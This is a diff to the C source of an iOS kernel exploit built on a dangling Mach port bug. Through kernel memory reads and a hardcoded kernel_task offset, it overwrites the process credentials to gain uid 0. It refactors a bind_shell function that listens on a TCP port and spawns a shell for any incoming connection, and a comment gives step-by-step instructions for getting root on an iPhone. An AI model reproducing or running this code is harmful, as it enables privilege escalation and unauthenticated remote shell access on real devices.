@@ -88,6 +88,8 @@ IOServiceOpen(
 /******** end extra headers ***************/
 
 mach_port_t user_client = MACH_PORT_NULL;
+uint64_t OFFSET_KERNEL_TASK = 0;
+uint64_t kt = 0;
 
 // make_dangling will drop an extra reference on port
 // this is the actual bug:
@@ -777,9 +779,9 @@ char* prepare_payload() {
     return path;
 }
 
-void bind_shell() {
+void bind_shell(char* env_path, int port) {
     
-    char* env = prepare_payload();
+    char* env = env_path;
     char* bundle_root = bundle_path();
     
     char* shell_path = NULL;
@@ -791,14 +793,12 @@ void bind_shell() {
     struct sockaddr_in sa;
     sa.sin_len = 0;
     sa.sin_family = AF_INET;
-    sa.sin_port = htons(493);
+    sa.sin_port = htons(port);
     sa.sin_addr.s_addr = INADDR_ANY;
-    
     int sock = socket(PF_INET, SOCK_STREAM, 0);
     bind(sock, (struct sockaddr*)&sa, sizeof(sa));
     listen(sock, 1);
-    
-    printf("shell listening on port %d\n", 493);
+    printf("shell listening on port %d\n", port);
     
     for(;;) {
         int conn = accept(sock, 0, 0);
@@ -812,8 +812,9 @@ void bind_shell() {
         
         
         pid_t spawned_pid = 0;
+        //uid_t old = get_root(rk64(kt + koffset(KSTRUCT_OFFSET_TASK_BSD_INFO)));
         int spawn_err = posix_spawn(&spawned_pid, shell_path, &actions, NULL, argv, envp);
-        
+        //setuid(old);
         if (spawn_err != 0){
             perror("shell spawn error");
         } else {
@@ -862,15 +863,14 @@ uint64_t get_our_proc() {
     return -1; // we failed :/
 }
 
-kern_return_t get_root (uint64_t kernel_task) {
+uid_t get_root (uint64_t kernel_task) {
     
-    kern_return_t ret = KERN_SUCCESS;
+    char* ret = "";
     
     uint64_t our_proc = get_our_proc();
     
     if(our_proc == -1) {
         printf("[ERROR]: no our proc. wut\n");
-        ret = KERN_FAILURE;
         return ret;
     }
     
@@ -899,11 +899,8 @@ kern_return_t get_root (uint64_t kernel_task) {
     }else{
         printf("[INFO]: wrote test file: %p\n", f);
     }
-    setuid(old);
-    printf("[INFO]: changed back to old uid: %d\n", getuid());
-    // you'll probably panic few seconds after this thanks to the new sandbox protections
     
-    return ret;
+    return old;
 }
 
 mach_port_t go() {
@@ -912,37 +909,39 @@ mach_port_t go() {
     
     /**
      
-     We can now temporarily gain root! I think we have to swap back to the old uid to prevent kernel panics though.
+     We can now temporarily gain uid=0! I think we have to swap back to the old uid to prevent kernel panics though.
      
      Here's how to do this on your phone:
      - Find your OFFSET_KERNEL_TASK using this guide from uroboro: https://gist.github.com/uroboro/5b2b2b2aa1793132c4e91826ce844957
      - Add your device to the u.machine comparisons (add an 'else if' with your device) and set the offset
      - Check console to ensure the test file is written!
-     - GG root.
+     - GG uid=0.
+     
+     Usage:
+     - call get_root() and store the uid it returns.
+     - do root stuff
+     - setuid(old_uid)
      
      */
     
     struct utsname u = {0};
     uname(&u);
     
-    uint64_t OFFSET_KERNEL_TASK = 0;
-    
     if(strstr(u.machine, "iPhone8,4")){
         OFFSET_KERNEL_TASK = 0xfffffff00760a048;
     }
     
     if(OFFSET_KERNEL_TASK != 0){
-        uint64_t kt = rk64(find_kernel_base() + (OFFSET_KERNEL_TASK-0xFFFFFFF007004000));
-        get_root(rk64(kt + koffset(KSTRUCT_OFFSET_TASK_BSD_INFO)));
+        kt = rk64(find_kernel_base() + (OFFSET_KERNEL_TASK-0xFFFFFFF007004000));
+        uid_t old = get_root(rk64(kt + koffset(KSTRUCT_OFFSET_TASK_BSD_INFO)));
+        // do root stuff
+        setuid(old);
+        //printf("will launch a shell with this environment: %s\n", env_path); // char* env_path = prepare_payload();
+        //bind_shell(env_path, 4141);
+        //free(env_path);
     }
     
     
-
-    //char* env_path = prepare_payload();
-    //printf("will launch a shell with this environment: %s\n", env_path);
-    
-    //bind_shell(env_path, 493);
-    //free(env_path);
     
   if (probably_have_correct_symbols()) {
     printf("have symbols for this device, testing the kernel debugger...\n");
